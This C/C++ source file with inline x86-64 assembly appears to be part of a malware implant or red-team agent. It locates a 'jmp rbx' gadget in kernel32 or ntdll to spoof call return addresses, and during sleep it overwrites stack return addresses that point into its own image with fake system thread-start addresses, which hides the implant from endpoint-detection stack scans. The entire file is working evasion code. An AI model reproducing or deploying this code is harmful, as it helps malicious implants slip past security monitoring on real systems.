#include "CallSpoof.h"
#include "ProcLoader.h"
#include "utils.h"
#include "ntdll.h"

#ifdef __x86_64__

extern "C" {
    PVOID g_JmpRbxGadget   = NULL;
    PVOID g_SpoofSavedRet  = NULL;
    PVOID g_SpoofSavedRbx  = NULL;
}

static PVOID FindGadget(HMODULE hModule, BYTE b1, BYTE b2)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            BYTE* start = (BYTE*)hModule + sec[i].VirtualAddress;
            DWORD size  = sec[i].Misc.VirtualSize;
            for (DWORD j = 0; j + 1 < size; j++) {
                if (start[j] == b1 && start[j + 1] == b2)
                    return &start[j];
            }
        }
    }
    return NULL;
}

BOOL CallSpoofInit()
{
    g_JmpRbxGadget = FindGadget(SysModules->Kernel32, 0xFF, 0xE3);
    if (!g_JmpRbxGadget)
        g_JmpRbxGadget = FindGadget(SysModules->Ntdll, 0xFF, 0xE3);
    return (g_JmpRbxGadget != NULL);
}

asm(
    ".intel_syntax noprefix\n"
    ".text\n"

    ".globl SpoofCall4\n"
    "SpoofCall4:\n"
    "    mov [rip + g_SpoofSavedRbx], rbx\n"
    "    mov rax, [rsp]\n"
    "    mov [rip + g_SpoofSavedRet], rax\n"
    "    lea rbx, [rip + _sc4_restore]\n"
    "    mov rax, [rip + g_JmpRbxGadget]\n"
    "    mov [rsp], rax\n"
    "    mov rax, rcx\n"
    "    mov rcx, rdx\n"
    "    mov rdx, r8\n"
    "    mov r8, r9\n"
    "    mov r9, [rsp + 0x28]\n"
    "    jmp rax\n"
    "_sc4_restore:\n"
    "    mov rbx, [rip + g_SpoofSavedRbx]\n"
    "    jmp qword ptr [rip + g_SpoofSavedRet]\n"
    "\n"

    ".globl SpoofCall6\n"
    "SpoofCall6:\n"
    "    mov [rip + g_SpoofSavedRbx], rbx\n"
    "    mov rax, [rsp]\n"
    "    mov [rip + g_SpoofSavedRet], rax\n"
    "    lea rbx, [rip + _sc6_restore]\n"
    "    mov rax, [rip + g_JmpRbxGadget]\n"
    "    mov [rsp], rax\n"
    "    mov rax, rcx\n"
    "    mov rcx, rdx\n"
    "    mov rdx, r8\n"
    "    mov r8, r9\n"
    "    mov r9, [rsp + 0x28]\n"
    "    mov r10, [rsp + 0x30]\n"
    "    mov [rsp + 0x28], r10\n"
    "    mov r10, [rsp + 0x38]\n"
    "    mov [rsp + 0x30], r10\n"
    "    jmp rax\n"
    "_sc6_restore:\n"
    "    mov rbx, [rip + g_SpoofSavedRbx]\n"
    "    jmp qword ptr [rip + g_SpoofSavedRet]\n"
);

// --- Thread stack spoofing during sleep ---

struct SAVED_FRAME {
    PVOID* location;
    PVOID  realAddr;
};

#define MAX_SAVED_FRAMES 64

static SAVED_FRAME* g_savedFrames = NULL;
static int g_numSavedFrames = 0;

void SpoofThreadStack(PVOID imageBase, SIZE_T imageSize)
{
    if (!g_savedFrames)
        g_savedFrames = (SAVED_FRAME*)ApiWin->LocalAlloc(LPTR, sizeof(SAVED_FRAME) * MAX_SAVED_FRAMES);
    if (!g_savedFrames)
        return;

    PVOID imageEnd = (BYTE*)imageBase + imageSize;

    PVOID fakeK32  = ApiNt->BaseThreadInitThunk;
    PVOID fakeNtdll = ApiNt->RtlUserThreadStart;
    if (!fakeK32)  fakeK32  = (PVOID)ApiWin->Sleep;
    if (!fakeNtdll) fakeNtdll = (PVOID)ApiNt->NtWaitForSingleObject;

    PVOID stackLimit = NtCurrentTeb()->NtTib.StackLimit;
    PVOID stackBase  = NtCurrentTeb()->NtTib.StackBase;

    PVOID rsp;
    asm volatile ("mov %%rsp, %0" : "=r"(rsp));

    g_numSavedFrames = 0;
    PVOID* addr = (PVOID*)rsp;
    PVOID* end  = (PVOID*)stackBase;

    while (addr < end && g_numSavedFrames < MAX_SAVED_FRAMES) {
        PVOID val = *addr;
        if (val >= imageBase && val < imageEnd) {
            g_savedFrames[g_numSavedFrames].location = addr;
            g_savedFrames[g_numSavedFrames].realAddr = val;
            *addr = (g_numSavedFrames % 2 == 0) ? fakeK32 : fakeNtdll;
            g_numSavedFrames++;
        }
        addr++;
    }
}

void RestoreThreadStack()
{
    if (!g_savedFrames)
        return;

    for (int i = g_numSavedFrames - 1; i >= 0; i--)
        *g_savedFrames[i].location = g_savedFrames[i].realAddr;

    g_numSavedFrames = 0;
}

#endif
